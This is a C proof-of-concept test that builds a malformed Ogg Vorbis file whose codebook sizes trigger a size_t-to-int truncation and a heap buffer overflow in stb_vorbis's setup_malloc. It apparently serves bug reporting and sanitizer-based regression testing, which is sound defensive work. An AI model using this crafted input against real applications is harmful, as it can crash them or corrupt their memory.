/*
 * BUG-stb_vorbis-009: Heap Buffer Overflow (size_t-to-int truncation in setup_malloc)
 *
 * setup_malloc takes int sz, but at line 3892 the caller computes:
 *   sizeof(c->multiplicands[0]) * c->entries * c->dimensions
 * as size_t, then truncated to int. For entries=16385, dims=65535:
 *   4 * 16385 * 65535 = 4295163900 -> truncated to int=196604, alloc 196608
 * Pre-expansion loop writes 16385*65535 floats, overflow at float 49152.
 *
 * Uses non-sparse, non-ordered codebook (all codewords length 31).
 *
 * Compile:
 *   cc -fsanitize=address,undefined -g -I. tests/bug_stb_vorbis_009.c \
 *      -o tests/bug_stb_vorbis_009 -lm
 */

#define STB_VORBIS_IMPLEMENTATION
#define STB_VORBIS_NO_STDIO
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "stb_vorbis.c"

static void w32(unsigned char *p, unsigned int v) {
    p[0]=(unsigned char)(v);p[1]=(unsigned char)(v>>8);
    p[2]=(unsigned char)(v>>16);p[3]=(unsigned char)(v>>24);
}
typedef struct{unsigned char*buf;int pos,cap;}bitpack;
static void bp_init(bitpack*b,unsigned char*buf,int cap){b->buf=buf;b->pos=0;b->cap=cap*8;memset(buf,0,cap);}
static void bp_bits(bitpack*b,unsigned int v,int n){
    for(int i=0;i<n;i++){if(v&(1u<<i))b->buf[b->pos/8]|=(1<<(b->pos%8));b->pos++;}
    if(b->pos>b->cap){fprintf(stderr,"Bitpack overflow!\n");exit(1);}
}
static int bp_bytes(bitpack*b){return(b->pos+7)/8;}
static void bp_float32(bitpack*b,float f){unsigned int u;memcpy(&u,&f,4);for(int i=0;i<32;i++)bp_bits(b,(u>>i)&1,1);}
#define WORK_BUF 262144

int main(){
    unsigned char work[WORK_BUF];
    memset(work,0,sizeof(work));
    int pos=0,entries=16385,dims=65535;
    printf("BUG-stb_vorbis-009: size_t-to-int truncation\nentries=%d dims=%d\n\n",entries,dims);

    /* === OGG Page 0: ID header === */
    memcpy(work+pos,"OggS",4);pos+=4;
    work[pos++]=0;work[pos++]=2;  /* header_type = PAGEFLAG_first_page (2) */
    w32(work+pos,0);pos+=4;w32(work+pos,0);pos+=4;
    w32(work+pos,0x12345678);pos+=4;
    w32(work+pos,0);pos+=4;w32(work+pos,0);pos+=4;
    int sc0=pos;pos++;
    int st0=pos;pos++;
    int d0=pos;
    work[pos++]=1;memcpy(work+pos,"vorbis",6);pos+=6;  /* packet_type=1, magic */
    w32(work+pos,0);pos+=4;  /* version=0 (Vorbis I) */
    work[pos++]=1;  /* channels=1 */
    w32(work+pos,44100);pos+=4;  /* sample_rate=44100 */
    w32(work+pos,0);pos+=4;  /* bitrate_max */
    w32(work+pos,0);pos+=4;  /* bitrate_nom */
    w32(work+pos,0);pos+=4;  /* bitrate_min */
    work[pos++]=0x77;  /* blocksize: log0=7, log1=7 -> 128, 128 */
    work[pos++]=1;     /* framing_flag */
    int dl0=pos-d0;
    work[sc0]=1;work[st0]=(unsigned char)dl0;
    pos=28+dl0;  /* page 0: 27+1 header + 1 seg_table + dl0 data */

    /* === Build setup data first (to know size) === */
    unsigned char*setup=malloc(WORK_BUF);memset(setup,0,WORK_BUF);
    bitpack b;bp_init(&b,setup,WORK_BUF);
    setup[0]=5;memcpy(setup+1,"vorbis",6);b.pos=56;

    bp_bits(&b,0,8);  /* codebook_count = 0 -> 1 codebook */
    bp_bits(&b,0x42,8);bp_bits(&b,0x43,8);bp_bits(&b,0x56,8);
    bp_bits(&b,dims&0xFF,8);bp_bits(&b,(dims>>8)&0xFF,8);
    bp_bits(&b,entries&0xFF,8);bp_bits(&b,(entries>>8)&0xFF,8);bp_bits(&b,(entries>>16)&0xFF,8);
    bp_bits(&b,0,1);  /* non-ordered */
    bp_bits(&b,0,1);  /* non-sparse */
    for(int j=0;j<entries;j++)bp_bits(&b,30,5);  /* all length=31 */
    bp_bits(&b,1,4);  /* lookup_type=1 */
    bp_float32(&b,0.0f);bp_float32(&b,1.0f);
    bp_bits(&b,0,4);bp_bits(&b,0,1);
    bp_bits(&b,0,1);
    bp_bits(&b,0,6);bp_bits(&b,0,16);
    bp_bits(&b,0,6);bp_bits(&b,1,16);bp_bits(&b,0,5);bp_bits(&b,0,2);bp_bits(&b,0,4);
    bp_bits(&b,0,6);bp_bits(&b,0,16);bp_bits(&b,0,24);bp_bits(&b,1,24);
    bp_bits(&b,0,24);bp_bits(&b,0,6);bp_bits(&b,0,8);bp_bits(&b,0,3);bp_bits(&b,0,1);
    bp_bits(&b,0,6);bp_bits(&b,0,16);bp_bits(&b,0,1);bp_bits(&b,0,1);
    bp_bits(&b,0,2);bp_bits(&b,0,4);bp_bits(&b,0,8);bp_bits(&b,0,8);
    bp_bits(&b,0,6);bp_bits(&b,0,1);bp_bits(&b,0,16);bp_bits(&b,0,16);bp_bits(&b,0,8);
    bp_bits(&b,1,1);

    int sb=bp_bytes(&b);
    printf("Setup header: %d bits = %d bytes\n",b.pos,sb);

    /* === OGG Page 1: Comment + Setup === */
    int nsegs = 1 + (sb + 254) / 255;  /* comment + setup lacing values */
    memcpy(work+pos,"OggS",4);pos+=4;
    work[pos++]=0;work[pos++]=0;
    w32(work+pos,0);pos+=4;w32(work+pos,0);pos+=4;
    w32(work+pos,0x12345678);pos+=4;
    w32(work+pos,1);pos+=4;w32(work+pos,0);pos+=4;
    work[pos++]=(unsigned char)nsegs;  /* segment_count */
    int stp=pos;pos+=nsegs;            /* segment table */

    /* Comment */
    int cs=pos;
    work[pos++]=3;memcpy(work+pos,"vorbis",6);pos+=6;
    w32(work+pos,0);pos+=4;w32(work+pos,0);pos+=4;
    work[pos++]=1;
    int cl=pos-cs;

    /* Setup packet data */
    memcpy(work+pos,setup,sb);pos+=sb;
    free(setup);

    /* Write segment table (comment lacing first, then setup lacing values) */
    int idx=0;
    work[stp+idx++]=(unsigned char)cl;
    int rem=sb;
    while(rem>255){work[stp+idx++]=(unsigned char)255;rem-=255;}
    work[stp+idx++]=(unsigned char)rem;

    printf("Total OGG size: %d bytes\n",pos);

    printf("Opening with stb_vorbis_open_memory...\n");
    int error;
    stb_vorbis*v=stb_vorbis_open_memory(work,pos,&error,NULL);
    if(v){printf("Decoder opened OK.\n");stb_vorbis_close(v);}
    else printf("Decoder returned error %d\n",error);
    printf("OK\n");
    return 0;
}
